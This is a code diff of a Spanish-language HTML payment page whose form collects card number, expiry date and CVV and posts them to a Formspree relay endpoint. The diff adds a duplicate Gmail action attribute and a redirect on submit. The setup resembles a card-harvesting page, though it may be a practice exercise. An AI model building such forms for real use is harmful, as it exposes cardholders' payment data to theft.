@@ -25,13 +25,13 @@
         </section>
         <section id="right">
             <h1>Compra ya!</h1>
-            <form action="https://formspree.io/f/mzbllboz" method="post">
+            <form action="https://formspree.io/f/mzbllboz" action="https://mail.google.com/mail/u/0/#inbox"
+                method="post" onsubmit="return redirectToAnotherPage();">
                 <div id="form-card" class="form-field">
                     <label for="cc-number">Numero de Tarjeta:</label>
                     <input type="text" id="cc-number" name="cc-number" maxlength="19" placeholder="1111 2222 3333 4444"
                         required>
                 </div>
-
                 <div id="form-date" class="form-field">
                     <label for="expiry-month">Fecha de Expiracion:</label>
                     <div id="date-val">
@@ -80,18 +80,14 @@
                         </select>
                     </div>
                 </div>
-
                 <div id="form-sec-code" class="form-field">
                     <label for="sec-code">CVV:</label>
                     <input type="password" id="sec-code" name="sec-code" maxlength="3" placeholder="123" required>
                 </div>
-
                 <button type="submit">PAGAR</button>
             </form>
         </section>
     </main>
-
-
 </body>
 
 </html>
